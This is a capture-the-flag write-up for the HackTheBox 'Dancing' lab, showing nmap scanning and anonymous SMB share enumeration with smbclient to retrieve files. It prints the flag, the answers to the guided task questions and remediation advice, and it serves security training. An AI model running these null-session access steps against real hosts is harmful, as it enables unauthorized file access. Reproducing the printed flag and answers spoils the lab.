# Dancing — HackTheBox Starting Point Writeup

![Platform](https://img.shields.io/badge/Platform-HackTheBox-9FEF00?logo=hackthebox&logoColor=black)
![Tier](https://img.shields.io/badge/Tier-0-brightgreen)
![OS](https://img.shields.io/badge/OS-Windows-blue?logo=windows&logoColor=white)
![Flags](https://img.shields.io/badge/Flags-1-orange)
![Foothold](https://img.shields.io/badge/Foothold-SMB%20(445)%20null%20session-red)

> **Target:** `10.129.85.185`
> **Foothold:** A non-default **SMB** share (`WorkShares`) readable over a **null session** (no credentials) — the flag sits in a user folder.

---

## 🧭 Overview

Dancing exposes **SMB** on a Windows host. The custom **`WorkShares`** share allows
**anonymous (null session)** access — no username or password required. Browsing it
reveals two user folders; `James.P\flag.txt` holds the flag. No exploitation or privilege
escalation is needed, just unauthenticated file access.

---

## 1. Reconnaissance

Host is up (TTL 127 → Windows):

```bash
ping 10.129.85.185
# 64 bytes from 10.129.85.185: icmp_seq=1 ttl=127 time=166 ms
```

```bash
nmap -sC -sV 10.129.85.185
```

```text
PORT     STATE SERVICE       VERSION
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
Service Info: OS: Windows
```

**Finding:** SMB (139/445) is open, and `5985` is WinRM. SMB is the first thing to try
anonymously.

---

## 2. Enumerate SMB Shares

List shares with a null session (`-N` = no password):

```bash
smbclient -L //10.129.85.185/ -N
```

```text
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        WorkShares      Disk
```

**Finding:** `ADMIN$`, `C$`, `IPC$` are default administrative shares. **`WorkShares`** is
custom — worth a look.

---

## 3. Foothold — Browse WorkShares

```bash
smbclient //10.129.85.185/WorkShares -N
```

```text
smb: \> ls
  Amy.J                               D        0  Mon Mar 29 05:08:24 2021
  James.P                             D        0  Thu Jun  3 04:38:03 2021
```

Two user directories. `Amy.J` holds a worknotes file; `James.P` holds the flag:

```text
smb: \> cd Amy.J
smb: \Amy.J\> ls
  worknotes.txt                       A       94  Fri Mar 26 07:00:37 2021
smb: \Amy.J\> get worknotes.txt

smb: \> cd James.P
smb: \James.P\> ls
  flag.txt                            A       32  Mon Mar 29 05:26:57 2021
smb: \James.P\> get flag.txt
```

> Note: `smbclient` has no `cat`. Use `get <file>` to download, then read it on your host.

`worknotes.txt` (harmless admin to-do, but confirms the box's theme):

```text
- start apache server on the linux machine
- secure the ftp server
- setup winrm on dancing
```

---

## 4. Flag

```bash
cat flag.txt
```

<details>
<summary>🚩 Click to reveal — FLAG</summary>

```text
5f61c10dffbc77a704d76016a22f1664
```
</details>

---

## 📝 Task Questions & Answers

<details>
<summary>📋 Click to reveal — guided task answers</summary>

| # | Question | Answer |
|---|----------|--------|
| 1 | What does the 3-letter acronym SMB stand for? | Server Message Block |
| 2 | What port does SMB use to operate at? | 445 |
| 3 | What network communication model does SMB use, architecturally speaking? | client-server |
| 4 | What is the service name for port 445 that came up in our Nmap scan? | microsoft-ds |
| 5 | What is the tool we use to connect to SMB shares from our Linux distribution? | smbclient |
| 6 | What 'flag'/'switch' can we use with the SMB tool to 'list' the share contents? | -L |
| 7 | How many shares are there on Dancing? | 4 |
| 8 | What is the name of the share we are able to access in the end? | WorkShares |
| 9 | What command can we use within the SMB shell to download the files we find? | get |
| 10 | Submit root flag | `5f61c10dffbc77a704d76016a22f1664` |

</details>


---

## 🛡️ Lessons / Remediation
- **Disable anonymous / null-session SMB access** — require authentication on every share.
- Don't store sensitive files on network shares with broad read permissions.
- Restrict SMB (445) to trusted networks; never expose it to untrusted segments.
